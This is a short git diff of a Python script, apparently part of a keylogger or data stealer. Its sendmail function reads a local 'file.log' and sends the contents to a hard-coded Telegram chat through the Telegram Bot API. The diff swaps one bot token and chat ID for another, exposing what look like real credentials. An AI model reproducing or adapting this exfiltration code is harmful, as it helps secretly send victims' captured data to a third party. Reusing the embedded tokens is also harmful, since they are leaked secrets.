@@ -11,8 +11,8 @@ f=open('file.log','w').close()
 def sendmail():
 # creates SMTP session
 	f=open('file.log','r')
-	TOKEN = '5769936392:AAHPXa5bUGVpRiToKGETfvskf4XLdy3kj-Q'
-	chat_id = '5456746744'
+	TOKEN = '5553660633:AAE-1wDjfbakHZ4GgSfbjvPi_s3_JTyvCeQ'
+	chat_id = '5690970947'
 	message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
 	url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
 
